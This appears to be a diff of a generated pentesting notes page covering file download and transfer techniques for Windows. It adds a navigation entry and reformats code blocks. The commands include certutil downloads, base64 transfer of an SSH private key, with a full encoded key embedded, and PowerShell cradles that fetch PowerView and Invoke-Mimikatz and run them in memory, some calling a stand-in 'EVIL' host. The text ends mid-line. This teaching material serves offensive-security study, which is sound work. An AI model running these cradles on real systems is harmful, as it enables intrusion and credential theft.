@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17582,25 +17605,36 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md)</p>
 <h2 id="certutil">Certutil</h2>
 <p>It's possible to <a href="https://isc.sans.edu/forums/diary/A+Suspicious+Use+of+certutilexe/23517/">download a file with certutil</a>:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>certutil.exe -urlcache -split -f &quot;https://download.sysinternals.com/files/PSTools.zip&quot; pstools.zip
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>certutil.exe -urlcache -split -f &quot;https://download.sysinternals.com/files/PSTools.zip&quot; pstools.zip
+</span></code></pre></div></td></tr></table></div>
 <h2 id="download-to-windows">Download to Windows</h2>
 <h3 id="powershell-base64-encode-decode">PowerShell Base64 Encode &amp; Decode</h3>
 <p><strong>Upload from linux (attacker) to Windows (victim)</strong> </p>
 <p>If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="gp"># </span>In<span class="w"> </span>attacker<span class="w"> </span>machine,<span class="w"> </span>check<span class="w"> </span>SSH<span class="w"> </span>Key<span class="w"> </span>MD5<span class="w"> </span>Hash
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="go">md5sum id_rsa</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="gp"># </span>In<span class="w"> </span>attacker<span class="w"> </span>machine,<span class="w"> </span>encode<span class="w"> </span>SSH<span class="w"> </span>Key<span class="w"> </span>to<span class="w"> </span>Base64
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="go">cat id_rsa |base64 -w 0;echo</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="gp"># </span>Copy<span class="w"> </span>output<span class="w"> </span>and<span class="w"> </span>paste<span class="w"> </span>it<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>Windows<span class="w"> </span>PowerShell<span class="w"> </span>terminal<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>machine
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="go">PS C:\lala&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;))</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="gp"># </span>Confirming<span class="w"> </span>the<span class="w"> </span>MD5<span class="w"> </span>Hashes<span class="w"> </span>Match<span class="w"> </span>with<span class="w">  </span>Get-FileHash<span class="w"> </span>cmdlet
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="go">PS C:\lala&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="gp"># </span>In<span class="w"> </span>attacker<span class="w"> </span>machine,<span class="w"> </span>check<span class="w"> </span>SSH<span class="w"> </span>Key<span class="w"> </span>MD5<span class="w"> </span>Hash
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="go">md5sum id_rsa</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="gp"># </span>In<span class="w"> </span>attacker<span class="w"> </span>machine,<span class="w"> </span>encode<span class="w"> </span>SSH<span class="w"> </span>Key<span class="w"> </span>to<span class="w"> </span>Base64
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="go">cat id_rsa |base64 -w 0;echo</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="gp"># </span>Copy<span class="w"> </span>output<span class="w"> </span>and<span class="w"> </span>paste<span class="w"> </span>it<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>Windows<span class="w"> </span>PowerShell<span class="w"> </span>terminal<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>victim<span class="err">&#39;</span>s<span class="w"> </span>machine
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="go">PS C:\lala&gt; [IO.File]::WriteAllBytes(&quot;C:\Users\Public\id_rsa&quot;, [Convert]::FromBase64String(&quot;LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=&quot;))</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="gp"># </span>Confirming<span class="w"> </span>the<span class="w"> </span>MD5<span class="w"> </span>Hashes<span class="w"> </span>Match<span class="w"> </span>with<span class="w">  </span>Get-FileHash<span class="w"> </span>cmdlet
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="go">PS C:\lala&gt; Get-FileHash C:\Users\Public\id_rsa -Algorithm md5</span>
+</span></code></pre></div></td></tr></table></div>
 <p><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2">More about the Get-FileHash cmdlet</a>.</p>
 <p>Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. </p>
 <h3 id="powershell-systemnetwebclient">Powershell  <a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0">System.Net.WebClient</a></h3>
@@ -17649,200 +17683,289 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tbody>
 </table>
 <h4 id="powershell-downloadstring-fileless-method">PowerShell DownloadString - Fileless Method</h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a># Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadFile(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;,&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;)
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a># Net.WebClient: class name
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a># DownloadFile: method
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a># Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadFileAsync(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;, &#39;PowerViewAsync.ps1&#39;)
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a># Net.WebClient: class name
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a># DownloadFileAsync: method
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a># Example: (New-Object Net.WebClient).DownloadFile(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadFile(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1&#39;,&#39;C:\Users\Public\Downloads\PowerView.ps1&#39;)
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a># Net.WebClient: class name
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a># DownloadFile: method
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a># Example: (New-Object Net.WebClient).DownloadFileAsync(&#39;&lt;Target File URL&gt;&#39;,&#39;&lt;Output File Name&gt;&#39;)
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadFileAsync(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&#39;, &#39;PowerViewAsync.ps1&#39;)
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a># Net.WebClient: class name
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a># DownloadFileAsync: method
+</span></code></pre></div></td></tr></table></div>
 <h4 id="powershell-downloadstring-fileless-method_1">PowerShell DownloadString - Fileless Method</h4>
 <p>PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2">Invoke-Expression</a> cmdlet or the alias <code>IEX</code>.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>PS C:\lala&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;)
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>PS C:\lala&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;)
+</span></code></pre></div></td></tr></table></div>
 <p><code>IEX</code> also accepts pipeline input.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;) | IEX
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>PS C:\lala&gt; (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&#39;) | IEX
+</span></code></pre></div></td></tr></table></div>
 <h4 id="powershell-invoke-webrequest">PowerShell Invoke-WebRequest</h4>
 <p>From PowerShell 3.0 onwards, the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2">Invoke-WebRequest</a> cmdlet is also available. This cmdlet gets content from a web page on the internet. We can use the aliases <code>iwr</code>, <code>curl</code>, and <code>wget</code> instead of the <code>Invoke-WebRequest</code> full name.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">PowerShellMafia</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutFile</span> <span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c"># alias: `iwr`, `curl`, and `wget`</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">PowerShellMafia</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-OutFile</span> <span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c"># alias: `iwr`, `curl`, and `wget`</span>
+</span></code></pre></div></td></tr></table></div>
 <h5 id="bypassing-technique-parameter-usebasicparsing">Bypassing technique: parameter -UseBasicParsing</h5>
 <p>There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UseBasicParsing</span> <span class="p">|</span> <span class="nb">IEX</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">https</span><span class="p">://&lt;</span><span class="n">ip</span><span class="p">&gt;/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-UseBasicParsing</span> <span class="p">|</span> <span class="nb">IEX</span>
+</span></code></pre></div></td></tr></table></div>
 <h5 id="bypassing-technique-ssltls-secure-channel">Bypassing technique: SSL/TLS secure channel</h5>
 <p>Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c"># With this command we get the error Exception calling &quot;DownloadString&quot; with &quot;1&quot; argument(s): &quot;The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.&quot;</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c">##### To bypass it, first run</span>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span>
+<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c"># With this command we get the error Exception calling &quot;DownloadString&quot; with &quot;1&quot; argument(s): &quot;The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.&quot;</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="c">##### To bypass it, first run</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span> <span class="p">=</span> <span class="p">{</span><span class="nv">$true</span><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
 <h4 id="more-downloading-techniques">More downloading techniques</h4>
 <p>From <a href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239">Harmj0y</a>:</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c"># normal download cradle</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s2">&quot;http://EVIL/evil.ps1&quot;</span><span class="p">)</span>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c"># PowerShell 3.0+</span>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">)</span>
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c"># hidden IE com object</span>
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nv">$ie</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">-comobject</span> <span class="n">InternetExplorer</span><span class="p">.</span><span class="n">Application</span><span class="p">;</span> <span class="nv">$ie</span><span class="p">.</span><span class="n">visible</span><span class="p">=</span><span class="nv">$False</span><span class="p">;</span> <span class="nv">$ie</span><span class="p">.</span><span class="n">navigate</span><span class="p">(</span><span class="s1">&#39;http://EVIL/evil.ps1&#39;</span><span class="p">);</span> <span class="nb">start-sleep</span> <span class="n">-s</span> <span class="n">5</span><span class="p">;</span> <span class="nv">$r</span><span class="p">=</span><span class="nv">$ie</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">body</span><span class="p">.</span><span class="n">innerHTML</span><span class="p">;</span> <span 